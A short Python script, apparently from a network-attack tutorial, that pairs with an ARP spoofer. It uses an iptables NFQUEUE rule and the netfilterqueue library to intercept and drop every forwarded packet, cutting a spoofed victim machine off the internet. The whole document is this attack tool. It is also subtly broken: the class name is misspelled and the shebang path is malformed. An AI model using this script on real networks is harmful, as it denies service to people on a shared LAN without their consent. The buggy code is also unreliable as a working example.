#this will drop the internet packets for other machine which is being spoofed by our ARP_Spoofer
#command before running this program, "iptables -I FORWARD -j NFQUEUE --queue-num 0"

#!usr/bin/env python
import netfilterqueue

def process_packet(packet):
    print(packet)
    #this will drop the all packets
    packet.drop()

queue = netfilterqueue.NetfiltetQueue()
# 0 because we specified 0 queue-num in command, "iptables -I FORWARD -j NFQUEUE --queue-num 0"
queue.bind(0,process_packet)
queue.run()